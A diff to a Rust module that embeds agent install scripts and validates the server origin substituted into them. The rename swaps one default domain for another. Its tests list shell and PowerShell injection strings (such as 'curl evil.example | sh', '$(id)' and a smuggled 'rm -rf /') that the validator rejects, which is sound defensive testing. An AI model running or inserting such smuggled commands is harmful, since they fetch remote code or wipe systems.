@@ -191,7 +191,7 @@ pub fn pick_setup_asset<'a>(
 /// embedded at COMPILE time so the API serves them with no runtime
 /// filesystem dependency. Canonical usage:
 ///
-///   curl -fsSL https://roomler.ai/api/setup/install.sh | sh -s -- \
+///   curl -fsSL https://meshharbor.itachi.fans/api/setup/install.sh | sh -s -- \
 ///       --role daemon --token <jwt>
 ///
 /// and the PowerShell twin via `/api/setup/install.ps1`. These are the
@@ -208,7 +208,7 @@ const INSTALL_PS1: &str = include_str!("../../../../scripts/install.ps1");
 /// no `$0`, no filename and no referrer. So without this a self-hosted
 /// deployment hands out a script that downloads the agent from the self-hosted
 /// server (that part is parameterised and works) and then enrols it against
-/// `roomler.ai` — which rejects a token only the self-hosted server can verify,
+/// `meshharbor.itachi.fans` — which rejects a token only the self-hosted server can verify,
 /// with an error that names the token rather than the server.
 ///
 /// ⚠️ Asserted to appear EXACTLY ONCE in each embedded script by
@@ -582,7 +582,7 @@ mod tests {
 
     /// The lock that makes the substitution non-silent. Without it, editing
     /// either script's `SERVER=` line disables the rewrite and nothing fails —
-    /// self-hosted installs quietly go back to enrolling against roomler.ai.
+    /// self-hosted installs quietly go back to enrolling against meshharbor.itachi.fans.
     #[test]
     fn the_server_default_is_substitutable_exactly_once() {
         assert_eq!(
@@ -602,15 +602,15 @@ mod tests {
     #[test]
     fn substitutable_origin_accepts_a_plain_scheme_host_port() {
         for (input, want) in [
-            ("https://roomler.ai", "https://roomler.ai"),
-            ("https://roomler.ai/", "https://roomler.ai"),
+            ("https://meshharbor.itachi.fans", "https://meshharbor.itachi.fans"),
+            ("https://meshharbor.itachi.fans/", "https://meshharbor.itachi.fans"),
             ("http://localhost:8080", "http://localhost:8080"),
             ("http://localhost:8080/", "http://localhost:8080"),
             (
                 "https://my-meshharbor.example.com:8443",
                 "https://my-meshharbor.example.com:8443",
             ),
-            ("  https://roomler.ai  ", "https://roomler.ai"),
+            ("  https://meshharbor.itachi.fans  ", "https://meshharbor.itachi.fans"),
             (
                 "https://www.itachi.fans/meshharbor",
                 "https://www.itachi.fans/meshharbor",
@@ -640,37 +640,37 @@ mod tests {
     fn substitutable_origin_refuses_anything_that_could_be_injected() {
         for input in [
             // shell metacharacters, straight into a double-quoted string
-            "https://roomler.ai\"; curl evil.example | sh; #",
-            "https://roomler.ai$(id)",
-            "https://roomler.ai`id`",
-            "https://roomler.ai${IFS}",
+            "https://meshharbor.itachi.fans\"; curl evil.example | sh; #",
+            "https://meshharbor.itachi.fans$(id)",
+            "https://meshharbor.itachi.fans`id`",
+            "https://meshharbor.itachi.fans${IFS}",
             // PowerShell single-quote break-out
-            "https://roomler.ai'; iex 'x",
+            "https://meshharbor.itachi.fans'; iex 'x",
             // newline — would append whole statements to the script
-            "https://roomler.ai\nrm -rf /",
+            "https://meshharbor.itachi.fans\nrm -rf /",
             // Paths must be literal-safe and cannot traverse or contain empty segments.
-            "https://roomler.ai/base/../other",
-            "https://roomler.ai/base/./other",
-            "https://roomler.ai/base//other",
-            "https://roomler.ai/base%2fother",
-            "https://roomler.ai/base$(id)",
-            "https://roomler.ai/base'; iex 'x",
+            "https://meshharbor.itachi.fans/base/../other",
+            "https://meshharbor.itachi.fans/base/./other",
+            "https://meshharbor.itachi.fans/base//other",
+            "https://meshharbor.itachi.fans/base%2fother",
+            "https://meshharbor.itachi.fans/base$(id)",
+            "https://meshharbor.itachi.fans/base'; iex 'x",
             // userinfo, query, fragment
-            "https://user:pw@roomler.ai",
-            "https://roomler.ai?x=1",
-            "https://roomler.ai#f",
+            "https://user:pw@meshharbor.itachi.fans",
+            "https://meshharbor.itachi.fans?x=1",
+            "https://meshharbor.itachi.fans#f",
             // wrong or missing scheme
-            "ftp://roomler.ai",
-            "roomler.ai",
-            "//roomler.ai",
+            "ftp://meshharbor.itachi.fans",
+            "meshharbor.itachi.fans",
+            "//meshharbor.itachi.fans",
             "",
             "   ",
             "https://",
             "https:///",
             // malformed port
-            "https://roomler.ai:",
-            "https://roomler.ai:80a",
-            "https://roomler.ai:123456",
+            "https://meshharbor.itachi.fans:",
+            "https://meshharbor.itachi.fans:80a",
+            "https://meshharbor.itachi.fans:123456",
         ] {
             assert_eq!(
                 substitutable_origin(input),
@@ -691,7 +691,7 @@ mod tests {
         assert!(sh.contains("SERVER=\"http://localhost:8080\""));
         assert!(
             !sh.contains(SERVER_NEEDLE_SH),
-            "the roomler.ai default must be gone, not merely joined"
+            "the meshharbor.itachi.fans default must be gone, not merely joined"
         );
 
         let ps1 = with_server_default(
@@ -728,7 +728,7 @@ mod tests {
             INSTALL_SH,
             SERVER_NEEDLE_SH,
             |o| format!("SERVER=\"{o}\""),
-            "https://roomler.ai\"; rm -rf /; #",
+            "https://meshharbor.itachi.fans\"; rm -rf /; #",
         );
         assert_eq!(sh.as_ref(), INSTALL_SH);
         assert!(sh.contains(SERVER_NEEDLE_SH));
